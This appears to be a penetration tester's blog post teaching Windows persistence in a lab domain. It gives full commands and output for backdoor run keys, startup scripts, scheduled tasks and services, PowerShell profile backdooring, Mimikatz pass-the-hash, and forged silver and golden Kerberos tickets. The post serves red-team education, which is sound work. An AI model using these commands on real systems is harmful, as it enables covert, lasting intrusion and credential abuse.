

  
    
  


  




  


  

<!DOCTYPE html>
<html lang="en-us">
  <head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Hugo 0.56.0">
    <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
    <title>A View of Persistence</title>
    <meta name="author" content="Rasta Mouse">
    <meta name="keywords" content="">

    <link rel="icon" href="https://rastamouse.me/favicon.ico">
    

    
    <meta name="description" content="
Persistence, noun, the continued or prolonged existence of something.
">
    <meta property="og:description" content="
Persistence, noun, the continued or prolonged existence of something.
">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="A View of Persistence">
    <meta property="og:url" content="/2018/03/a-view-of-persistence/">
    <meta property="og:site_name" content="Rasta Mouse">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Rasta Mouse">
    <meta name="twitter:description" content="
Persistence, noun, the continued or prolonged existence of something.
">
    
      <meta name="twitter:creator" content="@_RastaMouse">
    
    

    
    

    
      <meta property="og:image" content="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=640">
    

    
      <meta property="og:image" content="https://rastamouse.me/images/persist-ovr/thumb.jpg">
    
    
    

    

    
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.css" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" />
    
    
    <link rel="stylesheet" href="https://rastamouse.me/css/style-u6mk0ojoywresbx8iepslrmmhl4stuhrsxuwhkpwrkrx7mryjcaimasnk4pi.min.css" />
    
    

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-60712346-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="4"> 
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://rastamouse.me/">Rasta Mouse</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://rastamouse.me/#about">
    
    
    
      
        <img class="header-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=90" alt="Author&#39;s picture" />
      
    
    </a>
  
</header>
      <nav id="sidebar" data-behavior="4">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://rastamouse.me/#about">
          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
        </a>
        <h4 class="sidebar-profile-name">Rasta Mouse</h4>
        
          <h5 class="sidebar-profile-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/categories">
    
      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
      
      <span class="sidebar-button-desc">Categories</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/tags">
    
      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
      
      <span class="sidebar-button-desc">Tags</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/archives">
    
      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
      
      <span class="sidebar-button-desc">Archives</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/#about">
    
      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
      
      <span class="sidebar-button-desc">About</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">Home</span>
    </a>
  </li>

    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://twitter.com/_RastaMouse" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
      
      <span class="sidebar-button-desc">Twitter</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://keybase.io/rasta_mouse" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-lock"></i>
      
      <span class="sidebar-button-desc">Keybase</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://zeropointsecurity.co.uk/rastalabs/" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-shield"></i>
      
      <span class="sidebar-button-desc">RastaLabs</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/rasta-mouse" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>

    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/index.xml">
    
      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
      
      <span class="sidebar-button-desc">RSS</span>
    </a>
  </li>

    </ul>
  </div>
</nav>

      

      <div id="main" data-behavior="4"
        class="
               hasCoverMetaIn
               ">
        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
          
          
            <div class="post-header main-content-wrap text-left">
  
    <h1 class="post-title" itemprop="headline">
      A View of Persistence
    </h1>
  
  <div class="postShorten-meta post-meta">
  
    <time itemprop="datePublished" datetime="2018-03-22T00:00:00Z">
      
  
  
  
  
    22 March 2018
  

    </time>
  
  
  
  
    <span>in</span>
    
      <a class="category-link" href="https://rastamouse.me/categories/blog">blog</a>
    
  


</div>

</div>
          
          <div class="post-content markdown" itemprop="articleBody">
            <div class="main-content-wrap">
              <blockquote>
<p>Persistence, noun, the continued or prolonged existence of something.</p>
</blockquote>

<p>This is not something that usually gets much attention, despite it being a vital aspect of an attack lifecycle.  When reading up on subjects like the &ldquo;Cyber Kill Chain&rdquo;, we frequently see 7 main steps:</p>

<ol>
<li>Recon</li>
<li>Weaponisation</li>
<li>Delivery</li>
<li>Exploitation</li>
<li>Installation</li>
<li>Command &amp; Control</li>
<li>Actions on Objectives</li>
</ol>

<p>In this post, I want to run through some basic persistence strategies and techniques.</p>

<h2 id="c2-vs-privilege">C2 vs Privilege</h2>

<p>The installation step can be described as &ldquo;the installation of a backdoor on the compromised system, allowing an adversary to maintain persistence in the target environment&rdquo;.  The obvious translation is &ldquo;to regain command &amp; control over the system (should it be lost), without having to repeat steps 1 through 4.&rdquo;  For example, if we phish a user and establish C2 on their workstation, we need to ensure we can regain control should they reboot, or we kill our shell because we&rsquo;re noobs, without having to phish them again.</p>

<p>However, &ldquo;maintaining persistence&rdquo; is much more than just regaining C2 over a single (or even multiple) system(s) - it&rsquo;s about maintaining levels of privilege and access across an envronment.</p>

<p>If you have to repeat steps 1-4 to get back to a previous point, you are not being persistent.</p>

<h2 id="c2">C2</h2>

<h3 id="userland-vs-elevated">Userland vs Elevated</h3>

<p>Typically, persistence mechanisms that trigger a C2 channel exist in one of the following levels:</p>

<ol>
<li>Medium Mandatory Level in the context of a standard user.</li>
<li>High Mandatory Level in the context of SYSTEM.</li>
</ol>

<h4 id="userland-techniques">Userland Techniques</h4>

<h5 id="hkcu">HKCU</h5>

<p>Create a <code>REG_SZ</code> value in the <code>Run</code> key within <code>HKCU\Software\Microsoft\Windows</code>. (Other keys are available).</p>

<pre><code class="language-text">Value name:  Backdoor
Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
</code></pre>

<h5 id="start-up">Start-Up</h5>

<p>Create a batch script in the user startup folder.</p>

<pre><code class="language-text">PS C:\&gt; gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
</code></pre>

<h5 id="scheduled-tasks">Scheduled Tasks</h5>

<pre><code class="language-text">PS C:\&gt; $A = New-ScheduledTaskAction -Execute &quot;cmd.exe&quot; -Argument &quot;/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe&quot;
PS C:\&gt; $T = New-ScheduledTaskTrigger -AtLogOn -User &quot;Rasta&quot;
PS C:\&gt; $P = New-ScheduledTaskPrincipal &quot;Rasta&quot;
PS C:\&gt; $S = New-ScheduledTaskSettingsSet
PS C:\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
PS C:\&gt; Register-ScheduledTask Backdoor -InputObject $D
</code></pre>

<p>There are multiple trigger options to explore.</p>

<h5 id="powershell-profiles">PowerShell Profiles</h5>

<p>If your user is a heavy PowerShell user, backdoor their PowerShell profile.</p>

<pre><code class="language-text">PS C:\&gt; Test-Path $profile
False

PS C:\&gt; New-Item -Path $profile -Type File â€“Force

    Directory: C:\Users\Rasta\Documents\WindowsPowerShell

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       22/03/2018     12:42              0 Microsoft.PowerShell_profile.ps1

PS C:\&gt; $string = 'Start-Process &quot;cmd.exe&quot;'
PS C:\&gt; $string | Out-File -FilePath &quot;C:\Users\Rasta\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append
</code></pre>

<h4 id="elevated-techniques">Elevated Techniques</h4>

<h5 id="hklm">HKLM</h5>

<p>Similar to HKCU.  Create a <code>REG_SZ</code> value in the <code>Run</code> key within <code>HKLM\Software\Microsoft\Windows</code>.</p>

<pre><code class="language-text">Value name:  Backdoor
Value data:  C:\Windows\Temp\backdoor.exe
</code></pre>

<h5 id="services">Services</h5>

<p>Create a service that will start automatically or on-demand.</p>

<pre><code class="language-text">PS C:\&gt; New-Service -Name &quot;Backdoor&quot; -BinaryPathName &quot;C:\Windows\Temp\backdoor.exe&quot; -Description &quot;Nothing to see here.&quot;
</code></pre>

<h5 id="scheduled-tasks-1">Scheduled Tasks</h5>

<p>Scheduled Task to run as SYSTEM, everyday at 9am.</p>

<pre><code class="language-text">PS C:\&gt; $A = New-ScheduledTaskAction -Execute &quot;cmd.exe&quot; -Argument &quot;/c C:\Windows\Temp\backdoor.exe&quot;
PS C:\&gt; $T = New-ScheduledTaskTrigger -Daily -At 9am
PS C:\&gt; $P = New-ScheduledTaskPrincipal &quot;NT AUTHORITY\SYSTEM&quot; -RunLevel Highest
PS C:\&gt; $S = New-ScheduledTaskSettingsSet
PS C:\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
PS C:\&gt; Register-ScheduledTask Backdoor -InputObject $D
</code></pre>

<h2 id="maintaining-privilege">Maintaining Privilege</h2>

<h5 id="passwords">Passwords</h5>

<p>Steal clear text passwords and use them with <code>runas</code> or other session spawning functionality.</p>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\fs01\c$
Access is denied.
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;runas /netonly /user:FS01\Administrator cmd
Enter the password for FS01\Administrator:
Attempting to start cmd as user &quot;FS01\Administrator&quot; ...
</code></pre>

<pre><code class="language-text">C:\Windows\system32&gt;dir \\fs01\c$
 Volume in drive \\fs01\c$ has no label.
 Volume Serial Number is 069A-2329

 Directory of \\fs01\c$

16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
14/10/2017  10:26    &lt;DIR&gt;          Program Files
16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
22/03/2018  14:57    &lt;DIR&gt;          Users
22/03/2018  14:57    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               5 Dir(s)  41,994,084,352 bytes free
</code></pre>

<h5 id="ntlm-hashes">NTLM hashes</h5>

<p>If you can&rsquo;t get passwords, use NTLM hashes with techniques such as Pass-the-Hash or psexec.  Both domain accounts and local accounts can work.</p>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\fs01\c$
Access is denied.
</code></pre>

<pre><code class="language-text">mimikatz # sekurlsa::pth /user:Administrator /domain:FS01 /rc4:fc525c9683e8fe067095ba2ddc971889 /ptt
user    : Administrator
domain  : FS01
program : cmd.exe
impers. : no
NTLM    : fc525c9683e8fe067095ba2ddc971889
  |  PID  3876
  |  TID  2952
  |  LSA Process is now R/W
  |  LUID 0 ; 691999 (00000000:000a8f1f)
  \_ msv1_0   - data copy @ 00000214BC31C610 : OK !
  \_ kerberos - data copy @ 00000214BC5529B8
   \_ aes256_hmac       -&gt; null
   \_ aes128_hmac       -&gt; null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace -&gt; null
</code></pre>

<pre><code class="language-text">C:\Windows\system32&gt;dir \\fs01\c$
 Volume in drive \\fs01\c$ has no label.
 Volume Serial Number is 069A-2329

 Directory of \\fs01\c$

16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
14/10/2017  10:26    &lt;DIR&gt;          Program Files
16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
22/03/2018  14:57    &lt;DIR&gt;          Users
22/03/2018  14:57    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               5 Dir(s)  41,993,674,752 bytes free
</code></pre>

<h5 id="local-groups">Local Groups</h5>

<p>Adding new local users can provide a method of getting back into machines.  If placing them in the <code>Administrators</code> group is too obvious, use other privileged groups such as <code>Remote Desktop Users</code>, <code>Remote Management Users</code> or <code>Backup Operators</code>.</p>

<h5 id="domain-groups">Domain Groups</h5>

<p>Often times, domain groups are created to administer groups of machines by granting local admin privilege over them.  Adding your own domain account to these groups can provide you persistent access to multiple machines at once.</p>

<h5 id="silver-tickets">Silver Tickets</h5>

<p>With the NTLM hash of a computer account, silver tickets can be used to regain local admin privileges via the CIFS service.</p>

<pre><code class="language-text">* Username : FS01$
* Domain   : LAB
* NTLM     : 47b1d9d581f29b3b43845692bd4a0322
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\fs01\c$
Access is denied.
</code></pre>

<pre><code class="language-text">mimikatz # kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:fs01 /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt
User      : Administrator
Domain    : testlab.local (TESTLAB)
SID       : S-1-5-21-1516486103-3973840447-1748718438
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 47b1d9d581f29b3b43845692bd4a0322 - rc4_hmac_nt
Service   : cifs
Target    : fs01
Lifetime  : 22/03/2018 15:25:33 ; 19/03/2028 15:25:33 ; 19/03/2028 15:25:33
-&gt; Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ testlab.local' successfully submitted for current session
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\fs01\c$
 Volume in drive \\fs01\c$ has no label.
 Volume Serial Number is 069A-2329

 Directory of \\fs01\c$

16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
14/10/2017  10:26    &lt;DIR&gt;          Program Files
16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
22/03/2018  14:57    &lt;DIR&gt;          Users
22/03/2018  14:57    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               5 Dir(s)  41,994,330,112 bytes free
</code></pre>

<h5 id="golden-tickets">Golden Tickets</h5>

<p>Golden tickets can be used to forge access to any service in the domain.</p>

<pre><code class="language-text">SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 22/03/2018 14:49:02
Object Security ID   : S-1-5-21-1516486103-3973840447-1748718438-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9063b8edb3d04ed734edd49e5b0adef3
    ntlm- 0: 9063b8edb3d04ed734edd49e5b0adef3
    lm  - 0: be97fc24cf1ad2cc2d193430d113f45c
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\dc01\c$
Access is denied.
</code></pre>

<pre><code class="language-text">mimikatz # kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /rc4:9063b8edb3d04ed734edd49e5b0adef3 /ptt
User      : Administrator
Domain    : testlab.local (TESTLAB)
SID       : S-1-5-21-1516486103-3973840447-1748718438
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 9063b8edb3d04ed734edd49e5b0adef3 - rc4_hmac_nt
Lifetime  : 22/03/2018 15:36:25 ; 19/03/2028 15:36:25 ; 19/03/2028 15:36:25
-&gt; Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ testlab.local' successfully submitted for current session
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\dc01\c$
 Volume in drive \\dc01\c$ has no label.
 Volume Serial Number is 069A-2329

 Directory of \\dc01\c$

16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
14/10/2017  10:26    &lt;DIR&gt;          Program Files
16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
22/03/2018  14:42    &lt;DIR&gt;          Users
22/03/2018  14:48    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               5 Dir(s)  41,120,235,520 bytes free
</code></pre>

<h2 id="be-strategic">Be Strategic</h2>

<p>You should always have an idea of what your persistence strategy will be.  Take the time to understand the limitations and advantages of each technique.  Experiment with different payloads such as PowerShell, PE&rsquo;s, DLLs and scriptlets.  Learn about staged and stageless payloads and where they work best.  Consider the use of different transports like HTTP/S, SMB and DNS.</p>
              
            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">TAGGED IN</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/persistence/">persistence</a>

                  </div>
                
              
            
            <div class="post-actions-wrap">
  <nav>
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/05/review-active-directory-attacks-for-red-and-blue-teams/" data-tooltip="Review: Active Directory Attacks for Red and Blue Teams">
          
            <i class="fa fa-angle-left"></i>
            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
          </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/laps-part-2/" data-tooltip="LAPS - Part 2">
          
            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
            <i class="fa fa-angle-right"></i>
          </a>
        </li>
      
    </ul>
  </nav>
  <ul class="post-actions post-action-share">
    
      <li class="post-action hide-lg hide-md hide-sm">
        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
          <i class="fa fa-share-alt"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-google-plus"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-facebook-official"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-twitter"></i>
        </a>
      </li>
    
    
      <li class="post-action">
        <a class="post-action-btn btn btn--default" href="#disqus_thread">
          <i class="fa fa-comment-o"></i>
        </a>
      </li>
    
    <li class="post-action">
      
        <a class="post-action-btn btn btn--default" href="#">
      
        <i class="fa fa-list"></i>
      </a>
    </li>
  </ul>
</div>


            
              
                <div id="disqus_thread">
  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
              
            
          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
    &copy; 2019 Rasta Mouse. All Rights Reserved
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
        <div class="post-actions-wrap">
  <nav>
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/05/review-active-directory-attacks-for-red-and-blue-teams/" data-tooltip="Review: Active Directory Attacks for Red and Blue Teams">
          
            <i class="fa fa-angle-left"></i>
            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
          </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/laps-part-2/" data-tooltip="LAPS - Part 2">
          
            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
            <i class="fa fa-angle-right"></i>
          </a>
        </li>
      
    </ul>
  </nav>
  <ul class="post-actions post-action-share">
    
      <li class="post-action hide-lg hide-md hide-sm">
        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
          <i class="fa fa-share-alt"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-google-plus"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-facebook-official"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-twitter"></i>
        </a>
      </li>
    
    
      <li class="post-action">
        <a class="post-action-btn btn btn--default" href="#disqus_thread">
          <i class="fa fa-comment-o"></i>
        </a>
      </li>
    
    <li class="post-action">
      
        <a class="post-action-btn btn btn--default" href="#">
      
        <i class="fa fa-list"></i>
      </a>
    </li>
  </ul>
</div>


      </div>
      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
  <ul class="share-options">
    <li class="share-option">
      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
        <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
      </a>
    </li>
    <li class="share-option">
      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
        <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
      </a>
    </li>
    <li class="share-option">
      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
        <i class="fa fa-twitter"></i><span>Share on Twitter</span>
      </a>
    </li>
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>
    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-remove"></i>
    </div>
    
      <img id="about-card-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
    
    <h4 id="about-card-name">Rasta Mouse</h4>
    
      <div id="about-card-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        Penetration Tester
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker"></i>
        <br/>
        UK
      </div>
    
  </div>
</div>

    <div id="algolia-search-modal" class="modal-container">
  <div class="modal">
    <div class="modal-header">
      <span class="close-button"><i class="fa fa-close"></i></span>
      <a href="https://algolia.com" target="_blank" class="searchby-algolia text-color-light link-unstyled">
        <span class="searchby-algolia-text text-color-light text-small">by</span>
        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
      </a>
      <i class="search-icon fa fa-search"></i>
      <form id="algolia-search-form">
        <input type="text" id="algolia-search-input" name="search"
          class="form-control input--large search-input" placeholder="Search" />
      </form>
    </div>
    <div class="modal-body">
      <div class="no-result text-color-light text-center">no post found</div>
      <div class="results">
        
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/post/">
                <h3 class="media-heading">Posts</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Aug 8, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/08/tikiservice/">
                <h3 class="media-heading">TikiService</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Aug 8, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p><a href="https://github.com/rasta-mouse/TikiTorch/tree/master/TikiService">TikiService</a> is a new .NET Service Binary that allows you to run a TikiTorch payload via the Service Control Manager (Ã  la PsExec).  <a href="https://github.com/rasta-mouse/TikiTorch/blob/master/Aggressor/TikiTorch.cna">TikiTorch.cna</a> has also been updated to create a new Cobalt Strike function: <code>tikiexec</code>, that automates its use.  This blog post provides a brief overview and usage examples.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/08/covenant-donut-tikitorch/">
                <h3 class="media-heading">Covenant, Donut, TikiTorch</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Aug 8, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>Covenant <a href="https://github.com/cobbr/Covenant/commit/bde0df315f26b01a4ef5c5c00679b1e150998a35">v0.1</a> was first released in February 2019 and has since received a lot of really good updates.  <a href="https://github.com/cobbr/Covenant/commit/a2df643e01aea3ad7330bdba88ddd560692e46b4">v0.2</a> was released in May which added p2p comms over SMB named pipes, and <a href="https://github.com/cobbr/Covenant/commit/abcba78006c29b687f6e1a43a1ea1793784714fd">v0.3</a> was released in August which added a brand new web interface.  Even though it&rsquo;s such a young project, it has really proven itself to be a capable tool for offensive operators.  I&rsquo;ve not taken a look at Covenant since v0.1.x but since providing some new <a href="https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Persistence/WMI.cs">additions</a> to SharpSploit, it kinda got my geek going.  One of my areas of interest is weaponising the Grunt stager.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/06/the-return-of-aggressor/">
                <h3 class="media-heading">The Return of Aggressor</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jun 6, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>FortyNorth Security recently <a href="https://www.fortynorthsecurity.com/aggressive-msbuild-bypass-detection/">posted an article</a> detailing the process for leveraging MSBuild to execute unmanaged PowerShell, and automating it in Aggressor script for Cobalt Strike users.  Being a native binary in the Windows OS, the use of MSBuild is a <a href="https://lolbas-project.github.io/lolbas/Binaries/Msbuild/">common AWL bypass technique</a>, which is handy in relatively well locked down environments.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/06/tikivader/">
                <h3 class="media-heading">TikiVader</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jun 6, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>I&rsquo;ve added a new experimental project to <a href="https://github.com/rasta-mouse/TikiTorch">TikiTorch</a>, called <a href="https://github.com/rasta-mouse/TikiTorch/tree/master/TikiVader">TikiVader</a>.  I originally thought of &ldquo;vader&rdquo; as a play-on for &ldquo;evade&rdquo;/&ldquo;evader&rdquo;, until I realised TikiVader was never meant to evade anything&hellip; but nevermind ðŸ˜’</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2019/06/tikispawn-msbuild/">
                <h3 class="media-heading">TikiSpawn &amp; MSBuild</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jun 6, 2019
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>The main impetus behind this post was me experimenting with ways to leverage TikiSpawn with some of the popular <a href="https://lolbas-project.github.io">lolbins</a>.</p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
